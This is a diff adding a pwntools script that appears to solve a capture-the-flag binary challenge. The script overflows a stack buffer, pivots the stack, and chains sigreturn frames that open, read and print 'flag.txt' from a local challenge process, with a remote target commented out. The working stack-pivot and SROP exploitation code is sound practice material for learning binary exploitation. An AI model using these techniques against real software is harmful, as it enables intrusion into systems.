@@ -1,0 +1,114 @@
+#!/usr/bin/env python3
+from pwn import *
+import warnings
+warnings.filterwarnings("ignore")
+import signal
+def handle(signum, frame):
+    import os
+    print("killall gdb...")
+    os.system("killall gdb")
+    exit()
+signal.signal(signal.SIGINT, handle)
+exe = ELF("./challe")
+# context.log_level='debug'
+# p = remote("209.126.9.222", 5000)
+p = process([exe.path])
+p2 = process(["./run"])
+
+def gdbs():
+    context.terminal = ["foot"]
+    gdb.attach(p, gdbscript="""
+
+               """)
+    # p = gdb.debug([exe.path],"""
+    #
+    #                 """)
+
+sla = lambda msg, data: p.sendlineafter(msg, data)
+sa = lambda msg, data: p.sendafter(msg, data)
+sl = lambda data: p.sendline(data)
+s = lambda data: p.send(data)
+def writeframe(frame,writeaddr,data):
+
+    start = writeaddr-0x40
+    buffer = p64(exe.sym.main+4)+p64(syscall) + bytes(frame)
+    next_rbp = rw_section+len(buffer)+0x100
+    returnhere = start+56
+    print(f"len buffer: {len(buffer)}")
+    chunk_size = 72-8
+    chunks = [(b"opcode goes here".ljust(16,b"a")+data).ljust(56, b" ")+p64(next_rbp)]
+    chunks += [buffer[i:i + chunk_size].ljust(chunk_size, b"\x00") for i in range(0, len(buffer), chunk_size)]
+    print(f"num of chunks: {len(chunks)}")
+    input("write to address for returning")
+    rbpfake = rw_section+264+0x100
+    payload = b""
+    payload += p64(returnhere+8)
+    payload += p64(exe.sym.main+4)
+    payload = payload.ljust(72-8,b"A")
+    s(b"a".ljust(72-8,b"a")+p64(rbpfake+0x40)+p64(exe.sym.main+4))
+    input(f"write to address {hex(rbpfake)}")
+    s(payload+p64(rw_section)+p64(exe.sym.main+4))
+    for i in range(len(chunks)):
+        input(f"input the {i} chunk -> ")
+        fake_rbp = writeaddr+64*(i)+64
+        s(chunks[i]+p64(fake_rbp)+p64(exe.sym.main+8))
+
+
+    input("run syscall 0xf")
+    s(b"a".ljust(72-8,b"a")+p64(rbpfake)+p64(leave_ret))
+    inputof = start+384
+    input("enter opcode")
+    s(b"a".ljust(15))
+
+
+context.clear(arch="amd64")
+rop = ROP(exe)
+leave_ret = rop.find_gadget(["leave","ret"]).address
+ret = rop.find_gadget(["ret"]).address
+
+rw_section = 0x402000+0x800
+flag_addr = 0x402000
+start = 0x4027c0
+syscall = exe.sym.main+27
+frame = SigreturnFrame()
+frame.rax = 0x1b5
+frame.rdx = start+16 # open_how struct pointer
+frame.rsi = start+24+16 # flag path
+frame.rdi = -100&0xffffffff # relative path
+frame.r10 = 24
+frame.rbp = start+64-8
+frame.rsp = rw_section
+frame.rip = syscall
+
+input("start script")
+# gdbs()
+s(b"a"*(72-8)+p64(rw_section)+p64(exe.sym.main+4))
+writeframe(frame,rw_section,p64(0)+p64(0)+p64(0x00000001)+b"flag.txt\0") # struct and flagname
+frame.rax = 0
+frame.rdi = 3
+frame.rsi = flag_addr
+frame.rdx = 100
+frame.rsp = flag_addr
+frame.rip = syscall
+writeframe(frame,rw_section,p64(0))
+frame.rax = 1
+frame.rdi = 1
+frame.rsi = flag_addr
+frame.rdx = 100
+frame.rsp = flag_addr
+frame.rip = syscall
+writeframe(frame,rw_section,p64(0))
+
+
+
+# gdbs()
+
+
+
+
+
+
+# p.interactive()
+p2.interactive()
+# good luck pwning :)
+
